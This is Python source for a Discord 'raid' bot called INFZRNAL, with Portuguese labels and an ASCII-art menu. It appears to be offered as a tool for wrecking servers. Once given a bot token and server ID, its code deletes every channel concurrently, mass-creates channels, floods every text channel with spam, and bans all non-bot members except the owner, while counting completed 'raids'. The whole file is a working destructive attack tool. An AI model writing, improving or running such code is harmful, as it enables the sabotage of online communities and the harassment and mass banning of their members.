import asyncio
import threading
import os
import time
from datetime import datetime
from colorama import Fore, Back, Style, init
import discord
from discord.ext import commands

init(autoreset=True)

VERSION = 'V1 '
users = 1
raids_feitos = 0
bots_online = 1
criadores = 1

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def atualizar_titulo():
    while True:
        os.system(f"title INFZRNAL │ Users: {users} │ Raids: {raids_feitos} │ Bots: {bots_online} │ Criador: Black- / {criadores}")
        time.sleep(2)

threading.Thread(target=atualizar_titulo, daemon=True).start()

# --- ASCII raw ---
INFZRNAL_ART_RAW = """
███████╗ █████╗ ███████╗██╗  ██╗██╗██████╗  █████╗     
██╔════╝██╔══██╗██╔════╝██║  ██║██║██╔══██╗██╔══██╗    
███████╗███████║█████╗  ███████║██║██████╔╝███████║    
╚════██║██╔══██║██╔══╝  ██╔══██║██║██╔══██╗██╔══██║    
███████║██║  ██║██║     ██║  ██║██║██║  ██║██║  ██║    
╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    
                                                                                                                                                 
╔═════╩══════════════════╦═════════════════════════╦══════════════════╩═════╗  
╩ (1)< Excluir Canais      (5) < Criar Canal        (9)  < Spam Test        ╩   
  (2)< Listar Perms        (6) < Webhooks Info      (10) < Check Updates      
  (3)< Auditoria Logs      (7) < Banner Grab        (11) < Créditos        
╦ (4)< Roles Críticos      (8) < Banir Todos        (12) < Exit             ╦  
╚═════╦══════════════════╩═════════════════════════╩══════════════════╦═════╝  
"""

def print_ascii():
    term_width = os.get_terminal_size().columns
    print("\n".join(Fore.BLUE + line.center(term_width) for line in INFZRNAL_ART_RAW.splitlines()))

# --- Prompt azul ---
def custom_prompt(user: str = "user") -> str:
    deco = f"{Fore.BLUE}{Style.BRIGHT}-@INFZRNAL{Style.RESET_ALL}"
    prompt_line = f"{Fore.WHITE}{Back.BLUE}{user}{Style.RESET_ALL}/ {deco}: "
    return prompt_line

# --- Semáforos ---
semaphore_channels = asyncio.Semaphore(50)
semaphore_spam = asyncio.Semaphore(50)

# --- Funções ---
async def safe_delete_channel(ch):
    async with semaphore_channels:
        try:
            await ch.delete()
        except:
            pass

async def excluir_canais(guild):
    print(Fore.CYAN + "[!] Excluindo canais...")
    tasks = [safe_delete_channel(ch) for ch in guild.channels]
    await asyncio.gather(*tasks)
    print(Fore.BLUE + "Todos os canais deletados!")

async def safe_create_channel(guild, name):
    async with semaphore_channels:
        try:
            return await guild.create_text_channel(name)
        except:
            return None

async def criar_canais(guild, name, amount):
    try:
        amount = int(amount)
    except:
        amount = 50
    print(Fore.CYAN + f"[!] Criando {amount} canais '{name}'...")
    tasks = [safe_create_channel(guild, name) for _ in range(amount)]
    await asyncio.gather(*tasks)
    print(Fore.BLUE + "Canais criados!")

async def safe_send(ch, msg, total):
    async with semaphore_spam:
        for _ in range(total):
            try:
                await ch.send(msg)
            except:
                pass

async def spam_all(guild, msg, total):
    channels = [ch for ch in guild.text_channels]
    if not channels:
        print(Fore.RED + "Nenhum canal para spam!")
        return
    per_channel = max(1, total // len(channels))
    tasks = [safe_send(ch, msg, per_channel) for ch in channels]
    await asyncio.gather(*tasks)
    print(Fore.BLUE + "Spam concluído!")

async def banir_todos(guild):
    print(Fore.CYAN + "[!] Banindo todos os membros...")
    members = [m for m in guild.members if not m.bot and m.id != guild.owner_id]
    tasks = [m.ban(reason="INFZRNAL") for m in members]
    await asyncio.gather(*tasks)
    print(Fore.BLUE + "Banimento completo!")

# --- Painel ---
async def painel_menu(bot, guild_id, user_name):
    global raids_feitos
    guild = discord.utils.get(bot.guilds, id=int(guild_id))
    if not guild:
        print(Fore.RED + "[ERRO] Servidor não encontrado.")
        return

    while True:
        clear()
        print_ascii()
        print(Fore.BLUE + f"\nServidor: {guild.name} ({guild.member_count} membros)")
        escolha = input(custom_prompt(user_name)).strip()

        if escolha == "1":
            await excluir_canais(guild)
            raids_feitos += 1
        elif escolha == "5":
            name = input("Nome do canal: ").strip()
            amount = input("Quantidade: ")
            await criar_canais(guild, name, amount)
        elif escolha == "9":
            msg = input("Mensagem de spam: ").strip()
            total = int(input("Quantidade total: "))
            await spam_all(guild, msg, total)
        elif escolha == "8":
            await banir_todos(guild)
            raids_feitos += 1
        elif escolha == "11":
            print(Fore.BLUE + "Créditos: Black- ")
            input("ENTER para voltar...")
        elif escolha == "12":
            print(Fore.BLUE + "Saindo do painel...")
            await bot.close()
            break
        else:
            print(Fore.CYAN + "Opção inválida!")
            time.sleep(1)

# --- Bot ---
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    clear()
    user_name = input(Fore.BLUE + "Digite seu nome: ").strip()
    guild_id = input(Fore.BLUE + "DIGITE O ID DO SERVIDOR: ").strip()
    await painel_menu(bot, guild_id, user_name)

if __name__ == "__main__":
    clear()
    token = input(Fore.BLUE + "DIGITE O TOKEN: ").strip()
    bot.run(token)

